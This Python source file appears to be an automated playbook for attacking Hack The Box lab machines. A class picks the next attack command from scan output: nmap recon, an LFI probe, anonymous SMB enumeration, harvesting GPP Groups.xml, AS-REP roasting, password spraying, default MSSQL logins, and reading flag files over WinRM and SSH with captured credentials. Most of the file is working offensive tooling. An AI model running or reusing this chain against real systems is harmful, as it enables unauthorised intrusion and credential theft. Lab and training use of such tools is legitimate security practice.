"""Automatic HTB playbook. Never returns a repeating echo."""
from __future__ import annotations

from pathlib import Path

from core.lfi_probe import probe_command

STOP = ("__STOP__", "stop")
OSTICKET_PATHS = "/ /scp /open.php /login.php /tickets.php /kb/faq.php"


class LabPlaybook:
    def __init__(self, ip: str, workdir: Path):
        self.ip = ip
        self.work = workdir
        self.scans = workdir / "scans"
        self.loot = workdir / "loot"
        self.scans.mkdir(parents=True, exist_ok=True)
        self.loot.mkdir(parents=True, exist_ok=True)

    def _done(self, history: list, needle: str) -> bool:
        return any(needle in (h.get("command") or "") for h in history)

    def _scan_text(self) -> str:
        for name in ("version_scan.txt", "quick_scan.txt"):
            p = self.scans / name
            if p.exists():
                return p.read_text(errors="ignore")
        return ""

    def next_action(self, state: dict) -> tuple[str, str]:
        history = state.get("history", [])
        creds = state.get("credentials") or []
        users_file = self.loot / "users.txt"
        pass_file = self.loot / "passwords.txt"
        scan = self._scan_text()
        ip = self.ip
        ad = any(x in scan for x in ("88/tcp", "389/tcp", "445/tcp", "kerberos", "microsoft-ds"))
        web = ("80/tcp" in scan and "open" in scan) or ("443/tcp" in scan and "open" in scan)
        # nmap script lines contain 'http' even without a web port
        really_web = any(
            line.split()[0].startswith(("80/tcp", "443/tcp", "8080/tcp")) and " open " in line
            for line in scan.splitlines()
            if "/tcp" in line
        )
        web = really_web
        mssql = "1433/tcp" in scan
        winrm = "5985/tcp" in scan
        ssh = "22/tcp" in scan

        if not (self.scans / "quick_scan.txt").exists():
            return (f"nmap -Pn -T4 --top-ports 200 -sV --open -oN {self.scans}/quick_scan.txt {ip}", "recon")
        if not (self.scans / "version_scan.txt").exists():
            return (f"nmap -Pn -sC -sV -p- --min-rate 800 -oN {self.scans}/version_scan.txt {ip}", "recon")

        if web and not self._done(history, "web_headers.txt"):
            return (
                f"curl -skI --max-time 12 http://{ip} -o {self.loot}/web_headers.txt; "
                f"curl -skI --max-time 12 https://{ip} >> {self.loot}/web_headers.txt || true",
                "recon",
            )
        if web and not self._done(history, "web_index.html"):
            return (
                f"curl -skL --max-time 15 http://{ip}/ -o {self.loot}/web_index.html; "
                f"grep -iE 'osticket|support ticket|helpdesk|nginx|apache|title' "
                f"{self.loot}/web_index.html {self.loot}/web_headers.txt | head -40 || true",
                "recon",
            )
        if web and not self._done(history, "osticket_probe"):
            return (
                f"echo osticket_probe > /dev/null; "
                f"for p in {OSTICKET_PATHS}; do "
                f"code=$(curl -skI --max-time 8 -o /dev/null -w '%{{http_code}}' http://{ip}$p); "
                f"echo \"$p $code\"; done | tee {self.loot}/osticket_paths.txt",
                "recon",
            )
        if web and not self._done(history, "whatweb"):
            return (f"whatweb -a 3 --color=never http://{ip} 2>/dev/null | tee {self.loot}/whatweb.txt || true", "recon")
        if web and not self._done(history, "LFI probe"):
            return (probe_command(ip, self.loot), "enum")

        if ad and not self._done(history, "-u '' -p ''"):
            return (f"nxc smb {ip} -u '' -p '' --shares", "enum")
        if ad and not self._done(history, "-u guest"):
            return (f"nxc smb {ip} -u guest -p '' --shares", "enum")
        if ad and not self._done(history, "smbmap"):
            return (f"smbmap -H {ip} -u anonymous -p '' || smbmap -H {ip} || true", "enum")
        if ad and not self._done(history, "Replication"):
            return (
                f"smbclient -N -L //{ip} 2>/dev/null | tee {self.loot}/smb_shares.txt; "
                f"smbclient -N //{ip}/Replication -c 'recurse ON; prompt OFF; lcd {self.loot}; mget *Groups.xml' || "
                f"smbclient -N //{ip}/NETLOGON -c 'recurse ON; prompt OFF; lcd {self.loot}; mget *Groups.xml' || true; "
                f"find {self.loot} -iname 'Groups.xml' | tee {self.loot}/gpp_files.txt",
                "enum",
            )
        if ad and not self._done(history, "smb-vuln"):
            return (f"nmap --script smb-vuln* -p 445 {ip} -oN {self.scans}/smb_vuln.txt || true", "recon")

        if ad and not self._done(history, "ldapsearch"):
            return (
                f"ldapsearch -x -H ldap://{ip} -s base namingContexts || true",
                "enum",
            )

        if ad and users_file.exists() and users_file.stat().st_size > 0 and not self._done(history, "GetNPUsers"):
            return (
                f"impacket-GetNPUsers detected.htb/ -no-pass -dc-ip {ip} -usersfile {users_file} || true",
                "exploit",
            )

        if ad and users_file.exists() and pass_file.exists() and pass_file.stat().st_size > 0:
            if not self._done(history, "--continue-on-success"):
                return (
                    f"nxc smb {ip} -u {users_file} -p {pass_file} --continue-on-success",
                    "spray",
                )

        if creds:
            u, p = creds[0].get("username"), creds[0].get("password")
            if u and p:
                if not any(
                    f"-u {u}" in (h.get("command") or "") and "--shares" in (h.get("command") or "")
                    for h in history
                ):
                    return (f"nxc smb {ip} -u '{u}' -p '{p}' --shares", "enum")
                if not self._done(history, "smbclient"):
                    return (f"smbclient -U '{u}%{p}' -L //{ip} || true", "enum")
                if winrm and not self._done(history, "user.txt"):
                    return (
                        f"nxc winrm {ip} -u '{u}' -p '{p}' -x \"cmd /c type C:\\Users\\*\\Desktop\\user.txt\"",
                        "loot",
                    )
                if ssh and not self._done(history, "cat ~/user.txt"):
                    return (
                        f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 {u}@{ip} "
                        f"'cat user.txt ~/user.txt /home/*/user.txt 2>/dev/null'",
                        "loot",
                    )
                if winrm and not self._done(history, "root.txt"):
                    return (
                        f"nxc winrm {ip} -u '{u}' -p '{p}' -x \"cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt\"",
                        "loot",
                    )

        if mssql and not self._done(history, "nxc mssql"):
            return (f"nxc mssql {ip} -u sa -p sa --local-auth || true", "enum")
        return STOP
